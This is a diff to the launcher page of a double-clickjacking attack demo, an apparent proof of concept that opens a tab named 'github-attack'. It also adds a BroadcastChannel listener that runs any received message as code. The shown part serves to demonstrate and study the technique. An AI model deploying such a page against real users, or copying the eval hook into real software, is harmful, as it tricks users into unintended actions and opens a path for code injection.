@@ -1,29 +1,24 @@
 <!doctype html>
 <html>
   <head>
-    <title>Subvert demo</title>
+    <title>Double-clickjacking demo</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script>
+      new BroadcastChannel('eval').onmessage = (e) => new Function(e.data)()
+    </script>
   </head>
   <body>
     <h1>Double-clickjacking demo</h1>
 
-    Click <button id="start-button">here</button> to start the attack.
+    <!-- Click <button id="start-button">here</button> to start the attack. -->
+    Click <a href="attack" target="github-attack">here</a> to start the
+    attack.
 
-    <script>
-      document.getElementById('start-button').addEventListener('click', () => {
-        const attackTab = window.open('attack', '_blank')
-        if (!attackTab) {
-          alert('Please allow pop-ups for this site.')
-          return
-        }
-        window.done = () => {
-          setTimeout(() => {
-            attackTab.location.replace('success')
-          }, 750)
-          window.done = null
-        }
-      })
-    </script>
+    <!-- <script>
+      // document.getElementById('start-button').addEventListener('click', () => {
+      //   const attackTab = window.open('attack', '_blank')
+      // })
+    </script> -->
     <style>
       body {
         font-family: sans-serif;
